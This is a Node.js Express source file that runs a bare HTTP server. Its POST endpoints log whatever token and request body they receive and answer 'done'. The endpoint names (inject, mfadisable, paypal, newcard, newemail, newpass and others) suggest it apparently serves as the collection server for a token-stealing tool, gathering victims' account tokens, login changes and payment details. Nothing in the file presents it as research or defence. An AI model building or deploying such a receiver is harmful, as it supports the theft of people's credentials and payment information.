const app = require('express')(),
    bodyParser = require('body-parser'),
    http = require('http'),
    server = http.createServer(app);

app.set('port',3000);   
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({extended: true }));

app.post('/request/obtaining', (req, res) => {
    const { 
        token 
    } = req.body

    console.log(req.body)
    res.json({ message: 'done' });
});


app.post('/request/login', (req, res) => {
    const { 
        token 
    } = req.body

    console.log(req.body)
    res.json({ message: 'done' });
});

app.post('/request/inject', (req, res) => {
    const { 
        token 
    } = req.body

    console.log(req.body)
    res.json({ message: 'done' });
});

app.post('/request/mfadisable', (req, res) => {
    const { 
        token 
    } = req.body

    console.log(req.body)
    res.json({ message: 'done' });
});

app.post('/request/mfaenable', (req, res) => {
    const { 
        token 
    } = req.body

    console.log(req.body)
    res.json({ message: 'done' });
});

app.post('/request/paypal', (req, res) => {
    const { 
        token 
    } = req.body

    console.log(req.body)
    res.json({ message: 'done' });
});



app.post('/request/newcard', (req, res) => {
    const { 
        token 
    } = req.body

    console.log(req.body)
    res.json({ message: 'done' });
});


app.post('/request/newusername', (req, res) => {
    const { 
        token 
    } = req.body

    console.log(req.body)
    res.json({ message: 'done' });
});



app.post('/request/newemail', (req, res) => {
    const { 
        token 
    } = req.body

    console.log(req.body)
    res.json({ message: 'done' });
});


app.post('/request/newpass', (req, res) => {
    const { 
        token 
    } = req.body

    console.log(req.body)
    res.json({ message: 'done' });
});

server.listen(app.get('port'), () => {
    console.log(`Endpoint api in port: ${app.get('port')}`);
});
